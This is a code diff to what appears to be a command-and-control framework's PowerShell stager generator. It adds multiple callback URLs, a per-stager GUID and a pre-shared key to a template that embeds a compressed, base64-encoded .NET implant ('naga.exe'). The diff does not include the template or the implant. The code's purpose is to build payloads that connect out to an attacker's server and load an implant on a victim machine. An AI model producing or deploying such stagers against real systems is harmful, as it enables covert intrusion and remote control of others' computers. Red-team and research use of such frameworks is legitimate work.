@@ -1,7 +1,10 @@
 import logging
+import uuid
 from core.utils import gen_random_string
 from core.teamserver.stager import Stager
+from core.teamserver.crypto import gen_stager_psk
 from core.teamserver.utils import dotnet_deflate_and_encode
+
 
 class STStager(Stager):
     def __init__(self):
@@ -22,7 +25,12 @@ class STStager(Stager):
         with open('./core/teamserver/data/naga.exe', 'rb') as assembly:
             with open('core/teamserver/stagers/templates/posh.ps1') as template:
                 template = template.read()
-                c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"
+                c2_urls = ','.join(
+                    filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
+                )
+
+                guid = uuid.uuid4()
+                psk = gen_stager_psk()
 
                 if bool(self.options['AsFunction']['Value']) is True:
                     function_name = gen_random_string(6).upper()
@@ -30,17 +38,21 @@ class STStager(Stager):
 {{
     [CmdletBinding()]
     param (
+        [Parameter(Mandatory=$true)][String]$Guid,
+        [Parameter(Mandatory=$true)][String]$Psk,
         [Parameter(Mandatory=$true)][String]$Url
     )
 
     {template}
 }}
-Invoke-{function_name} -Url "{c2_url}"
+Invoke-{function_name} -Guid '{guid}' -Psk '{psk}' -Url '{c2_urls}'
 """
                 else:
-                    template = template.replace("$Url", f'"{c2_url}"')
+                    template = template.replace("$Url", f'{c2_urls}')
+                    template = template.replace("$Guid", f'{guid}')
+                    template = template.replace("$Psk", f'{psk}')
 
                 assembly = assembly.read()
                 template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly))
                 template = template.replace("DATA_LENGTH", str(len(assembly)))
-                return template
+                return guid, psk, template
